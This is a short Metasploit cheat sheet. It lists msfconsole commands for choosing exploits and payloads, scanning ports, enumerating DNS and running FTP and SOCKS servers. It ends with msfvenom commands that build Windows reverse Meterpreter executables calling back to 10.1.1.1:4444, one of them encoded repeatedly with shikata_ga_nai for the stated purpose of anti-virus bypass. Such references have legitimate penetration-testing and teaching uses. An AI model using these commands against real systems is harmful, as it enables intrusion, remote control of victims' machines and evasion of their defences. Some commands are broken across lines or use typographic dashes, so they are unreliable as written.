# Metasploit
msf > search [regex]
msf > use exploit/[ExploitPath]
msf > set PAYLOAD [PayloadPath]
msf > show options
msf > set [Option] [Value]
msf > exploit 
#Useful Auxiliary Module
msf > use auxiliary/scanner/portscan/tcp
msf > set RHOSTS 10.10.10.0/24
msf > run
# DNS Enumeration:
msf > use auxiliary/gather/dns_enum
msf > set DOMAIN target.tgt
msf > run
#FTP Server:
msf > use auxiliary/server/ftp
msf > set FTPROOT /tmp/ftproot
msf > run
#Proxy Server:
msf > use auxiliary/server/socks4
msf > run 
#msfvenom
$ msfvenom –p [PayloadPath]
–f [FormatType]
LHOST=[LocalHost (if reverse conn.)]
LPORT=[LocalPort]
#Example :

Reverse Meterpreter payload as an executable and redirected into a file:

$ msfvenom -p windows/meterpreter/
reverse_tcp -f exe LHOST=10.1.1.1
LPORT=4444 > met.exe
Format Options (specified with –f) --help-formats – List available output formats

exe – Executable pl – Perl rb – Ruby raw – Raw shellcode c – C code

Encoding Payloads with msfvenom

The msfvenom tool can be used to apply a level of encoding for anti-virus bypass. Run with '-l encoders' to get a list of encoders.#
$ msfvenom -p [Payload] -e [Encoder] -f
[FormatType] -i [EncodeInterations]
LHOST=[LocalHost (if reverse conn.)]
LPORT=[LocalPort]
# Example

Encode a payload from msfpayload 5 times using shikata-ga-nai encoder and output as executable:

$ msfvenom -p windows/meterpreter/
reverse_tcp -i 5 -e x86/shikata_ga_nai -f
exe LHOST=10.1.1.1 LPORT=4444 > mal.exe
